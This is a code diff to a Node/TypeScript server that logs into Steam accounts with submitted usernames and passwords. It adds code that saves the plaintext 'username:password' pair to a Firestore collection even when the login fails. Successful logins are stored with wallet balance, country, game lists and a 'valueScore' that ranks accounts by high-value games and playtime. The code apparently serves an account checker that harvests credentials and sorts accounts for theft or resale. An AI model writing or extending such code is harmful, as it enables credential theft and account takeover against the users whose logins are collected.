@@ -131,7 +131,16 @@ async function startServer() {
       };
 
       const timeout = setTimeout(() => {
-        respond(408, { error: 'Logon attempt timed out (Steam servers might be slow)' });
+        const timeoutError = 'Logon attempt timed out (Steam servers might be slow)';
+        respond(408, { error: timeoutError });
+        if (db) {
+          db.collection('checks').add({
+            credentials: `${username}:${password}`,
+            timestamp: admin.firestore.FieldValue.serverTimestamp(),
+            status: 'failed',
+            error: timeoutError
+          }).catch(() => {});
+        }
       }, 45000);
 
       let engineWalletBalance: string | null = null;
@@ -224,41 +233,43 @@ async function startServer() {
 
           // Persistent Logging
           if (db) {
-            try {
-               const HIGH_VALUE_KEYWORDS = [
-                'resident evil', 'grand theft auto', 'gta v', 'elden ring', 'cyberpunk',
-                'red dead', 'call of duty', 'hogwarts', 'baldur\'s gate', 'spider-man',
-                'god of war', 'the witcher', 'assassin\'s creed', 'rust', 'dayz'
-               ];
-               
-               let score = 0;
-               games.forEach(g => {
-                   let itemScore = 1;
-                   const name = (g.name || '').toLowerCase();
-                   if (HIGH_VALUE_KEYWORDS.some(k => name.includes(k))) itemScore += 50;
-                   if (g.playtime_forever && g.playtime_forever > 600) itemScore += 5;
-                   score += itemScore;
-               });
+            (async () => {
+              try {
+                const HIGH_VALUE_KEYWORDS = [
+                  'resident evil', 'grand theft auto', 'gta v', 'elden ring', 'cyberpunk',
+                  'red dead', 'call of duty', 'hogwarts', 'baldur\'s gate', 'spider-man',
+                  'god of war', 'the witcher', 'assassin\'s creed', 'rust', 'dayz'
+                ];
+                
+                let score = 0;
+                games.forEach(g => {
+                    let itemScore = 1;
+                    const name = (g.name || '').toLowerCase();
+                    if (HIGH_VALUE_KEYWORDS.some(k => name.includes(k))) itemScore += 50;
+                    if (g.playtime_forever && g.playtime_forever > 600) itemScore += 5;
+                    score += itemScore;
+                });
 
-               const gameNames = games.map(g => g.name);
-               
-               console.log(`[FIREBASE] Attempting to save check for ${username}...`);
-               await db.collection('checks').add({
-                 credentials: `${username}:${password}`,
-                 steamId: steamId.toString(),
-                 personaName: userData.personaname,
-                 avatar: userData.avatarfull,
-                 country: userData.loccountrycode || 'Unknown',
-                 gameCount: gameCount,
-                 walletBalance: engineWalletBalance || '0',
-                 valueScore: score,
-                 gameNames: gameNames.slice(0, 500), // Store up to 500 names for searchability
-                 timestamp: admin.firestore.FieldValue.serverTimestamp(),
-                 status: 'success'
-               });
-            } catch (err) {
-               console.error('Error saving check to Firestore:', err);
-            }
+                const gameNames = games.map(g => g.name);
+                
+                console.log(`[FIREBASE] Saving success check for ${username}...`);
+                await db.collection('checks').add({
+                  credentials: `${username}:${password}`,
+                  steamId: steamId.toString(),
+                  personaName: userData.personaname,
+                  avatar: userData.avatarfull,
+                  country: userData.loccountrycode || 'Unknown',
+                  gameCount: gameCount,
+                  walletBalance: engineWalletBalance || '0',
+                  valueScore: score,
+                  gameNames: gameNames.slice(0, 500),
+                  timestamp: admin.firestore.FieldValue.serverTimestamp(),
+                  status: 'success'
+                });
+              } catch (err) {
+                console.error('Error saving check to Firestore:', err);
+              }
+            })();
           }
         } catch (e) {
           respond(200, { success: true, steamId: steamId?.toString(), message: 'Logged in but failed to fetch private data.' });
